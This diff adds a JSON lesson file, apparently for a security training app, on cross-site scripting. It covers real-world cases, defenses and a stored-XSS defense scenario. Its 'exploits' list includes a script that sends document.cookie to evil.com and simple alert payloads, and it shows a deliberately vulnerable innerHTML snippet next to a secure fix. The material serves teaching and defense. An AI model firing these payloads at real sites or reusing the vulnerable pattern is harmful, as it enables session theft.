@@ -1,0 +1,48 @@
+{
+  "id": "xss",
+  "title": "Cross-Site Scripting (XSS)",
+  "category": "CLIENT-SIDE",
+  "difficulty": "Intermediate",
+  "tags": ["WEB", "HIGH", "OWASP"],
+  "estimatedMinutes": 15,
+  "lessons": 5,
+  "description": "Inject malicious scripts into trusted websites to steal sessions, deface sites, or redirect users.",
+  "lesson": {
+    "summary": "Cross-Site Scripting (XSS) allows an attacker to execute malicious JavaScript in the victim's browser. This occurs when untrusted data is included in a web page without proper validation or escaping.",
+    "realWorld": [
+      "Samy MySpace Worm (Infected 1M+ profiles in 20 hours)",
+      "TweetDeck XSS Worm (Forced retweets of malicious script)",
+      "British Airways Magecart (Stole 380k credit cards via XSS)"
+    ],
+    "exploits": [
+      "<script>fetch('http://evil.com/?cookie='+document.cookie)</script>",
+      "<img src='x' onerror='alert(1)'>",
+      "javascript:alert(1)"
+    ],
+    "vulnerableCode": "const name = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('greeting').innerHTML = `Hello, ${name}`;",
+    "secureCode": "const name = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('greeting').textContent = `Hello, ${name}`;",
+    "defenses": [
+      "Context-Aware Output Encoding",
+      "Content Security Policy (CSP)",
+      "Use safe DOM APIs (textContent instead of innerHTML)"
+    ],
+    "mistakes": [
+      "Using innerHTML blindly",
+      "Blacklisting specific tags instead of whitelisting or escaping",
+      "Reflecting input directly in script tags"
+    ],
+    "tips": [
+      "Use modern frameworks (React, Vue) that escape output by default.",
+      "Implement a strict CSP to block inline scripts.",
+      "Set HttpOnly flags on session cookies."
+    ]
+  },
+  "arena": {
+    "attackId": "xss_01",
+    "attackName": "Stored XSS via Comments",
+    "attackVector": "DOM Injection",
+    "attackSeverity": "high",
+    "attackDescription": "An attacker is uploading a comment containing an obfuscated `<svg onload=\"steal()\">` payload aiming to steal admin cookies.",
+    "correctDefenses": ["csp_header", "output_encoding"]
+  }
+}
